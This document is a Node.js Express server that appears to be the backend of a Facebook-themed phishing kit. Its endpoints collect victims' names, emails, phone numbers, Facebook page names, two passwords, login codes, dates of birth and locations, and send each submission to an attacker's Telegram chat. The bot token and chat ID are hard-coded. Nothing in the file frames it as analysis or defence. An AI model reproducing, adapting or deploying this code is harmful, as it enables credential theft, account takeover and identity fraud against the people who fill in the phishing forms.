const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors'); 
const app = express();
const IP = require('ip');
const port = 3000; // Choose an appropriate port

// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
const TELEGRAM_BOT_TOKEN = '5788363554:AAF-SVpxKsmsqyNVzLnJffQ1XqJoXCwRmo0';
const TELEGRAM_CHAT_ID = '-907272935'; // Replace with your actual chat ID

app.use(bodyParser.json());
app.use(cors())
 app.listen(80, function () {
  console.log('CORS-enabled web server listening on port 80')
})

app.get('/', (req, res) => {
    const ipAddress = IP.address();
    res.send(ipAddress)
  })
app.post('/api/confirm', async (req, res) => {
    const formData = req.body;

    // Filter out empty values
    const filteredData = Object.fromEntries(
        Object.entries(formData).filter(([key, value]) => value !== '')
    );

    const ipAddress = IP.address();
    const message = `
        Reason: ${filteredData.reason || 'N/A'}
        Full Name: ${filteredData.full_name || 'N/A'}
        Business Email: ${filteredData.business_email || 'N/A'}
        Personal Email: ${filteredData.personal_email || 'N/A'}
        Phone: ${filteredData.phone || 'N/A'}
        Facebook Page Name: ${filteredData.facebook_pagename || 'N/A'}
        First Password: ${filteredData.first_password || 'N/A'}
        Second Password: ${filteredData.second_password || 'N/A'}
        LoginCODE: ${filteredData.logincode || 'N/A'}
        IP Address: ${ipAddress}
    `;

    try {
        // Send the message to Telegram
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });

        return res.status(200).send({ success: true });
    } catch (error) {
        return res.status(500).send({ success: false });
    }
});
app.post('/api/info', async (req, res) => {
    const formData = req.body;

    // if (!formData.reason || !formData.full_name || !formData.business_email || !formData.personal_email || !formData.phone || !formData.facebook_pagename || !formData.first_password || !formData.second_password) {
    //     return res.status(400).json({ success: false, message: 'Please provide all required information.' });
    // }
    const ipAddress = IP.address();
    // Construct the message
    const message = `
        First Name: ${formData.first_name}
        Full Name: ${formData.last_name}
        DateOfBirth: ${formData.dd}/${formData.mm}/${formData.yyyy}
        City: ${formData.city}
        Region: ${formData.region}
        Country: ${formData.country}
        IP Address: ${ipAddress}
    `;

    try {
        // Send the message to Telegram
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });

        return res.status(200).send({ success: true });
    } catch (error) {
        return res.status(500).send({ success: false });
    }
});
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});